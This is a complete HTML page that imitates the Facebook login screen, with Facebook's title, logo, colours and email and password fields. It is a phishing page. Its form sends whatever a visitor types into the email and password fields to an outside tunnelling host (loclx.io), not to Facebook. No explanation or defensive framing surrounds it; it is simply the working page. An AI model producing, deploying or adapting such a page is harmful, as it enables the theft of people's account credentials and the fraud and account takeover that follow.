<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In or Sign Up</title>
    <style>
        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-container { width: 400px; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); text-align: center; }
        .fb-logo { color: #1877f2; font-size: 40px; font-weight: bold; margin-bottom: 20px; }
        input { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; }
        .login-btn { width: 95%; padding: 12px; background-color: #1877f2; border: none; border-radius: 6px; color: white; font-size: 20px; font-weight: bold; cursor: pointer; }
        .forgot { color: #1877f2; font-size: 14px; margin-top: 15px; display: block; text-decoration: none; }
        hr { margin: 20px 0; border: 0; border-top: 1px solid #dadde1; }
        .create-btn { background-color: #42b72a; padding: 12px; border: none; border-radius: 6px; color: white; font-size: 17px; font-weight: bold; cursor: pointer; text-decoration: none; }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="fb-logo">facebook</div>
        <form action="https://bmz2emfzou.ap.loclx.io method="POST">
            <input type="text" name="email" placeholder="Email address or phone number" required>
            <input type="password" name="pass" placeholder="Password" required>
            <button type="submit" class="login-btn">Log In</button>
            <a href="#" class="forgot">Forgotten password?</a>
            <hr>
            <button type="button" class="create-btn">Create new account</button>
        </form>
    </div>
</body>
</html>
